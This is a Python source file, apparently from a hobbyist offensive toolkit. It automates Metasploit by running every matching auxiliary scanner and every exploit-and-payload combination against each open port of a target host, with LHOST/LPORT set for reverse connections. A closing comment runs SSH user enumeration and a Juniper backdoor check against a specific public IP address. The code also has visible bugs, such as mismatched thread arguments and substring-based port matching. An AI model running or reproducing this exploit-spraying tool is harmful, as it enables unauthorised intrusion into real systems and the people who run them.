# LOCAL
from File_man import File_Man
from micro_scans import MicroScans

# SYS_BASE
import subprocess
from threading import Thread
import time


class MetaFab():
    def __init__(self, **kw):
        super(MetaFab, self).__init__(**kw)
        self.FM         = File_Man()
        self.MS         = MicroScans()


    # ? AUXIs
    # ! BUILD AUXILIARY CMD_STR FOR CLI
    def build_auxi(self, target_, port_, module_, dest_):
        try:
            meta_   = " msfconsole -q -x "
            use_    = f"use {module_};"
            rhost_  = f"set RHOSTS {target_};"
            rport_  = f"set RPORT {port_};"
            run_    = " run;"
            exit_   = " exit;"

            to_run = meta_+use_+rhost_+rport_+run_+exit_
            #print(f"\n!****!\n[TO_RUN_AUXI]:\n>>[>{str(to_run)}<]")
            print(f"[SAVING_AUXI]:[>{str(dest_)}<]")
            self.FM.write_file(dest_, to_run, "\n", "w")

            auxi_ret = subprocess.getoutput(to_run)
            print(f"\n*******\n[AUXILIARY_STACK]\n$$ {str(auxi_ret)} \n $$")

        except Exception as e:
            print(f"[E]:[BUILD_AUXI]:[{str(e)}]")

    # ! START AUXILIARY THREAD
    def auxi_thread(self, i_, target_, port_, module_, dest_):
        try:
            # ! FILTER MODULE_DATA -> MOD_DIR
            mod_ = str(module_.split(" ")[0])
            print(f"[NEW_AUX_THREAD]:[{str(i_)}]")  #:[{str(mod_)}]")
            print(f"[DEST_]:[{str(dest_)}]")
            Thread(target=self.build_auxi, args=(target_, port_, mod_, dest_)).start()
        except Exception as e:
            print(f"[E_!]:[AUXI_THREAD]:[>{str(e)}<]")


    # ? EXPLOITS
    # ! BUILD EXPLOIT CMD_STR FOR CLI
    def build_xploit(self, target_, port_, l_host, l_port, module_, payload_, dest_):
        try:
            meta_   = " msfconsole -q -x "
            use_0   = f"'use {module_};"
            use_1   = f"use {payload_};"
            rhost_  = f"set RHOSTS {target_};"
            rport_  = f"set RPORT {port_};"
            l_host  = f"set LHOST {l_host};"
            l_port  = f"set LPORT {l_port};"

            run_    = " run;"
            exit_   = " exit'"

            to_run = meta_+use_0+use_1+l_host+l_port+rhost_+rport_+run_+exit_
            #print(f"\n!****!\n[TO_RUN_EXPL]:\n>>[>{str(to_run)}<]")
            print(f"[SAVING_XPL]:[>{str(dest_)}<]")
            self.FM.write_file(dest_, to_run, "\n", "w")

            expl_ret = subprocess.getoutput(to_run)

        except Exception as e:
            print(f"[E]:[BUILD_SPLOIT]:[{str(e)}]")

    # ! START EXPLOT THREAD
    def expl_thread(self, i_, j_, target_, port_, l_host, l_port,  module_, payload_, dest_):
        try:
            # ! FILTER MODULE_DATA -> MOD_DIR
            mod_ = str(module_.split(" ")[0])
            # ! FILTER PAYLOAD_DATA -> PAYLOAD_DIR
            pay_ = str(payload_.split(" ")[0])
            print(f"[NEW_XPL_THREAD]:[{str(i_)}]:[{str(j_)}]")   #:[{str(mod_)}]:-:[{str(pay_)}]")
            Thread(target=self.build_xploit, args=(target_, port_, module_, pay_, dest_)).start()
        except Exception as e:
            print(f"[E_!]:[EXPL_THREAD]:[>{str(e)}<]")


    # ! SEARCH MATCHING CONFIGS
    def check_port_conf(self, l_host, l_port, prof_dir, meta_dir, target_, p_type, port_str, i_):
        try:
 
            # ! FILTER PORT_DATA -> NUMBER
            print(f"[FULL_PORT_VAL]:[>{port_str}<]")
            port_ = str(port_str)    #.split("/")[0])
            print(f"[PORT_NUMBER]:[>{str(port_)}<]")
            # ! COLLECT EACH LIST
            meta_aux_ = self.FM.read_file("meta_lists_/auxiliary.csv", "\n")
            meta_exp_ = self.FM.read_file("meta_lists_/exploit.csv", "\n")
            meta_pay_ = self.FM.read_file("meta_lists_/payload.csv", "\n")

            # ? I don't yet know how to use these.. :|
            #meta_pos_ = self.FM.read_file("meta_lists_/post.csv", "\n")
            #meta_nop_ = self.FM.read_file("meta_lists_/nops.csv", "\n")
            #meta_enc_ = self.FM.read_file("meta_lists_/encoder.csv", "\n")

            # ! CONFIG BUILDS
            each_aux_ = []
            each_exp_ = []
            each_pay_ = []

            print("@@@[LEN_AUXI_LIST]",str(len(meta_aux_)), "\n")
            print("@@@[LEN_EXPL_LIST]",str(len(meta_exp_)), "\n")
            print("@@@[LEN_PAYL_LIST]",str(len(meta_pay_)), "\n")

            # ! FIND MATCHES
            # ? AUXILIARY
            for i, aux_ in enumerate(meta_aux_):
                print(f"~~[AUI_I_]:[I]:[>{str(i)}<]")
                if str(p_type) in str(aux_):
                    print(f"-- [CONFIG]:[AUX]:[{str(i)}]")  # -[>{str(aux_)}<]")
                    # ! ADD TO REPORT LIST 'AUX_'
                    #this_aux_ = str(aux_)
                    auxi_file = meta_dir+f"auxi_{str(port_)}_{str(i)}_.csv"
                    print("[USING_DIR]:",str(auxi_file))
                    #each_aux_.append(this_aux_)
                    time.sleep(1)
                    self.auxi_thread(i, target_, port_, aux_, auxi_file)


            # ? EXPLOIT
            for k, exp_ in enumerate(meta_exp_):
                print(f"~~[EXPL_K_]:[K]:[>{str(k)}<]")
                if str(p_type) in str(exp_):
                    print(f"-- [CONFIG]:[EXP]:[{str(k)}]") # -[>{str(exp_)}<]")
                    # ? PAYLOAD
                    for j, pay_ in enumerate(meta_pay_):
                        print(f"-- -- [EXP]--[PAY]:[J]:[{str(j)}]")  #-[[>{str(pay_)}<]] ")
                        # ! ADD TO REPORT LIST 'PAY_'
                        #this_pay_ = str(pay_)
                        #each_pay_.append(this_pay_)
                        expl_file = meta_dir+f"expl_{str(port_)}_{str(k)}_{str(j)}_.csv"

                        self.expl_thread(k,j, target_, port_, l_host, l_port, exp_, pay_, expl_file)

                    # ! ADD TO REPORT LIST 'EXPL_'
                    #each_exp_.append(each_pay_)
                    #each_pay_ = []
        except Exception as e:
            print(f"[E]:[CHECK_PORT]:[{str(e)}]")


    # ! CHECK PORT TYPE
    def check_port_type(self, port_):
        try:
            # ? tcp
            if "21" in str(port_):
                return "tcp"
            if "443" in str(port_):
                return "tcp"
            # ? ssh
            if "22" in str(port_):
                return "ssh"
            # ? smtp
            if "25" in str(port_):
                return "smpt"
            if "465" in str(port_):
                return "smpt"
            if "587" in str(port_):
                return "smpt"
            if "2525" in str(port_):
                return "smpt"
            # ? pop3
            if "110" in str(port_):
                return "pop3"
            if "995" in str(port_):
                return "pop3"
            # ? imap
            if "143" in str(port_):
                return "imap"
            if "993" in str(port_):
                return "imap"
            # ? sql
            if "1443" in str(port_):
                return "sql"
            if "4022" in str(port_):
                return "sql"
            if "1351" in str(port_):
                return "sql"
            if "1434" in str(port_):
                return "sql"
            # ? what_app
            if "5222" in str(port_):
                return "whatsapp"
            # ? http
            if "80" in str(port_):
                return "http"
            if "8080" in str(port_):
                return "http"
        except Exception as e:
            print(f"[E]:[PORT_TYPE_CHECK]:[>{str(e)}<]")


    # ! START 'McBRETA' _STACK_
    def set_meta_stack_(self, l_host, l_port, target_, prof_dir, type_, tcp_):
        print(f"[RUNNING]:[SET_META_LAB]:[>{target_}<]:[>{type_}<]")
        try:
            ## ! USE IP_ 
            #try:
            #    if type_ == "URL":
            #        try:
            #            IP_ = self.MS.dis_lookup(target_)
            #            print(f"[FETCHING]:[IP_]:[>{str(IP_)}<]")
            #        except Exception as e:
            #            print(f"[E]:[URL-to-IP]:[>{str(e)}<]")
            #except Exception as e:
            #    print(f"[E]:[GET_IP]:[{str(e)}]")
            meta_dir = prof_dir+"/meta_dir/"
            self.FM.make_dir(meta_dir)

            if len(tcp_) >= 1:
                print("\n[*!*]\n\n[GOT_PORTS]")
                try:
                    for i, val in enumerate(tcp_):
                        print(f"[X]:[RUNNING_]:\n    [#]:[{str(i)}]:\n    [PORT]:[{str(val)}]\n")
                        # ! CHECK PORT CONFIGS
                        p_type = self.check_port_type(val)
                        self.check_port_conf(l_host, l_port, prof_dir, meta_dir, target_, p_type, str(val), i)
                        time.sleep(5)
                except Exception as e:
                    print(f"[E]:[RUN_LOAD_PORTS_]:[{str(e)}]")

        except Exception as e:
            print(f"[E]:[SET_META_STACK]:[{str(e)}]")




# msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_version; set RHOSTS 41.203.16.195; set RPORT 22; run; exit' && msfconsole -q -x 'use scanner/ssh/ssh_enumusers; set RHOSTS 41.203.16.195; set RPORT 22; run; exit' && msfconsole -q -x 'use auxiliary/scanner/ssh/juniper_backdoor; set RHOSTS 41.203.16.195; set RPORT 22; run; exit'
